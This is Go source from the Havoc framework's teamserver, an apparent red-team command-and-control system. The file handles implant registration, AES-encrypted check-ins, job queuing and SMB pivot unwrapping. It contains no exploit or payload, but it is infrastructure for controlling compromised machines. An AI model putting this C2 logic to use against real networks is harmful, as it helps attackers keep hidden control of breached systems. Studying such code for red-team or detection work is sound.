package handlers

import (
	"bytes"
	//"encoding/hex"
	"fmt"
	"math/bits"

	"Havoc/pkg/agent"
	"Havoc/pkg/common/packer"
	"Havoc/pkg/common/parser"
	"Havoc/pkg/logger"
)

// parseAgentRequest
// parses the agent request and handles the given data.
// return 2 types.
// Response is the data/bytes once this function finished parsing the request.
// Success is if the function was successful while parsing the agent request.
//
//	Response byte.Buffer
//	Success	 bool
func parseAgentRequest(Teamserver agent.TeamServer, Body []byte, ExternalIP string) (bytes.Buffer, bool) {

	var (
		Header   agent.Header
		Response bytes.Buffer
		err      error
	)

	Header, err = agent.ParseHeader(Body)
	if err != nil {
		logger.Debug("[Error] Header: " + err.Error())
		return Response, false
	}

	if Header.Data.Length() < 4 {
		return Response, false
	}

	// handle this demon connection if the magic value matches
	if Header.MagicValue == agent.DEMON_MAGIC_VALUE {
		return handleDemonAgent(Teamserver, Header, ExternalIP)
	}

	// If it's not a Demon request then try to see if it's a 3rd party agent.
	return handleServiceAgent(Teamserver, Header, ExternalIP)
}

// handleDemonAgent
// parse the demon agent request
// return 2 types:
//
//	Response bytes.Buffer
//	Success  bool
func handleDemonAgent(Teamserver agent.TeamServer, Header agent.Header, ExternalIP string) (bytes.Buffer, bool) {

	var (
		Agent     *agent.Agent
		Response  bytes.Buffer
		RequestID uint32
		Command   uint32
		Packer    *packer.Packer
		Build     []byte
		err       error
	)

	/* check if the agent exists. */
	if Teamserver.AgentExist(Header.AgentID) {

		/* get our agent instance based on the agent id */
		Agent = Teamserver.AgentInstance(Header.AgentID)
		Agent.UpdateLastCallback(Teamserver)

		// while we can read a command and request id, parse new packages
		first_iter := true
		asked_for_jobs := false
		for (Header.Data.CanIRead(([]parser.ReadType{parser.ReadInt32, parser.ReadInt32}))) {
			Command   = uint32(Header.Data.ParseInt32())
			RequestID = uint32(Header.Data.ParseInt32())

			/* check if this is a 'reconnect' request */
			if Command == agent.DEMON_INIT {
				logger.Debug(fmt.Sprintf("Agent: %x, Command: DEMON_INIT", Header.AgentID))
				Packer = packer.NewPacker(Agent.Encryption.AESKey, Agent.Encryption.AESIv)
				Packer.AddUInt32(uint32(Header.AgentID))

				Build = Packer.Build()

				_, err = Response.Write(Build)
				if err != nil {
					logger.Error(err)
					return Response, false
				}
				logger.Debug(fmt.Sprintf("reconnected %x", Build))
				return Response, true
			}

			if first_iter {
				first_iter = false
				// if the message is not a reconnect, decrypt the buffer
				Header.Data.DecryptBuffer(Agent.Encryption.AESKey, Agent.Encryption.AESIv)
			}

			/* The agent is sending us the result of a task */
			if Command != agent.COMMAND_GET_JOB {
				Parser := parser.NewParser(Header.Data.ParseBytes())
				Agent.TaskDispatch(RequestID, Command, Parser, Teamserver)
			} else {
				asked_for_jobs = true
			}
		}

		/* if there is no job then just reply with a COMMAND_NOJOB */
		if asked_for_jobs == false || len(Agent.JobQueue) == 0 {
			var NoJob = []agent.Job{{
				Command: agent.COMMAND_NOJOB,
				Data:    []interface{}{},
			}}

			var Payload = agent.BuildPayloadMessage(NoJob, Agent.Encryption.AESKey, Agent.Encryption.AESIv)

			_, err = Response.Write(Payload)
			if err != nil {
				logger.Error("Couldn't write to HTTP connection: " + err.Error())
				return Response, false
			}

		} else {
			/* if there is a job then send the Task Queue */
			var (
				job     = Agent.GetQueuedJobs()
				payload = agent.BuildPayloadMessage(job, Agent.Encryption.AESKey, Agent.Encryption.AESIv)
			)

			// write the response to the buffer
			_, err = Response.Write(payload)
			if err != nil {
				logger.Error("Couldn't write to HTTP connection: " + err.Error())
				return Response, false
			}

			// TODO: move this to its own function
			// show bytes for pivot
			var CallbackSizes = make(map[uint32][]byte)
			for j := range job {

				if len(job[j].Data) >= 1 {

					switch job[j].Command {

					case agent.COMMAND_PIVOT:

						if job[j].Data[0] == agent.DEMON_PIVOT_SMB_COMMAND {

							var (
								TaskBuffer    = job[j].Data[2].([]byte)
								PivotAgentID  = int(job[j].Data[1].(uint32))
								PivotInstance *agent.Agent
							)

							for {
								var (
									Parser       = parser.NewParser(TaskBuffer)
									CommandID    = 0
									SubCommandID = 0
								)

								Parser.SetBigEndian(false)

								Parser.ParseInt32()
								Parser.ParseInt32()

								CommandID = Parser.ParseInt32()

								// Socks5 over SMB agents yield a CommandID equal to 0
								if CommandID != agent.COMMAND_PIVOT && CommandID != 0 {
									//CallbackSizes[uint32(PivotAgentID)] = append(CallbackSizes[job[j].Data[1].(uint32)], TaskBuffer...)
									break
								}

								/* get an instance of the pivot */
								PivotInstance = Teamserver.AgentInstance(PivotAgentID)
								if PivotInstance != nil {
									break
								}

								/* parse the task from the parser */
								TaskBuffer = Parser.ParseBytes()

								/* create a new parse for the parsed task */
								Parser = parser.NewParser(TaskBuffer)
								Parser.DecryptBuffer(PivotInstance.Encryption.AESKey, PivotInstance.Encryption.AESIv)

								if Parser.Length() >= 4 {

									SubCommandID = Parser.ParseInt32()
									SubCommandID = int(bits.ReverseBytes32(uint32(SubCommandID)))

									if SubCommandID == agent.DEMON_PIVOT_SMB_COMMAND {
										PivotAgentID = Parser.ParseInt32()
										PivotAgentID = int(bits.ReverseBytes32(uint32(PivotAgentID)))

										TaskBuffer = Parser.ParseBytes()
										continue

									} else {
										CallbackSizes[uint32(PivotAgentID)] = append(CallbackSizes[job[j].Data[1].(uint32)], TaskBuffer...)

										break
									}

								}

							}

						}

						break

					case agent.COMMAND_SOCKET:

						break

					case agent.COMMAND_FS:

						break

					case agent.COMMAND_MEM_FILE:

						break

					default:
						//logger.Debug("Default")
						/* build the task payload */
						payload = agent.BuildPayloadMessage([]agent.Job{job[j]}, Agent.Encryption.AESKey, Agent.Encryption.AESIv)

						/* add the size of the task to the callback size */
						CallbackSizes[uint32(Header.AgentID)] = append(CallbackSizes[uint32(Header.AgentID)], payload...)

						break

					}

				} else {
					CallbackSizes[uint32(Header.AgentID)] = append(CallbackSizes[uint32(Header.AgentID)], payload...)
				}

			}

			for agentID, buffer := range CallbackSizes {
				Agent = Teamserver.AgentInstance(int(agentID))
				if Agent != nil {
					Teamserver.AgentCallbackSize(Agent, len(buffer))
				}
			}

			CallbackSizes = nil
		}

	} else {
		logger.Debug("Agent does not exists. hope this is a register request")

		var (
			Command = Header.Data.ParseInt32()
		)

		/* TODO: rework this. */
		if Command == agent.DEMON_INIT {
			// RequestID, unused on DEMON_INIT
			Header.Data.ParseInt32()

			Agent = agent.ParseDemonRegisterRequest(Header.AgentID, Header.Data, ExternalIP)
			if Agent == nil {
				return Response, false
			}

			go Agent.BackgroundUpdateLastCallbackUI(Teamserver)

			Agent.Info.MagicValue = Header.MagicValue
			Agent.Info.Listener = nil /* TODO: pass here the listener instance/name */

			Teamserver.AgentAdd(Agent)
			Teamserver.AgentSendNotify(Agent)

			Packer = packer.NewPacker(Agent.Encryption.AESKey, Agent.Encryption.AESIv)
			Packer.AddUInt32(uint32(Header.AgentID))

			Build = Packer.Build()

			_, err = Response.Write(Build)
			if err != nil {
				logger.Error(err)
				return Response, false
			}

			logger.Debug("Finished request")
		} else {
			logger.Debug("Is not register request. bye...")
			return Response, false
		}
	}

	return Response, true
}

// handleServiceAgent
// handles and parses a service agent request
// return 2 types:
//
//	Response bytes.Buffer
//	Success  bool
func handleServiceAgent(Teamserver agent.TeamServer, Header agent.Header, ExternalIP string) (bytes.Buffer, bool) {

	var (
		Response  bytes.Buffer
		AgentData any
		Agent     *agent.Agent
		Task      []byte
		err       error
	)

	/* search if a service 3rd party agent was registered with this MagicValue */
	if !Teamserver.ServiceAgentExist(Header.MagicValue) {
		return Response, false
	}

	Agent = Teamserver.AgentInstance(Header.AgentID)
	if Agent != nil {
		AgentData = Agent.ToMap()
		go Agent.BackgroundUpdateLastCallbackUI(Teamserver)
	}

	Task = Teamserver.ServiceAgent(Header.MagicValue).SendResponse(AgentData, Header)
	//logger.Debug("Response:\n", hex.Dump(Task))

	_, err = Response.Write(Task)
	if err != nil {
		return Response, false
	}

	return Response, true
}

// notifyTaskSize
// notifies every connected operator client how much we send to agent.
func notifyTaskSize(teamserver agent.TeamServer) {

}
